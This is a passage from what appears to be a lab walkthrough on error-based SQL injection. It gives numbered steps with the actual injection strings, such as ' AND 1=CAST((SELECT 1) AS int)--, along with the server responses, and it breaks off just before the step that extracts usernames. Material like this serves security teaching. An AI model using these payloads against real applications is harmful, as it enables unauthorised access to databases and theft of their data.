2. Fix the query by commenting the rest query. We did not received any error. This suggests that the query is now syntactically valid. 
'--  --{200 OK

3. Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type:
' AND CAST((SELECT 1) AS int)--
ERROR: argument of AND must be type boolean, not type integer Position: 63

4. Modify the condition accordingly. For example, you can simply add a comparison operator (=) as follows: 
' AND 1=CAST((SELECT 1) AS int)--  --{200 OK

5. Adapt your generic SELECT statement so that it retrieves usernames from the database:
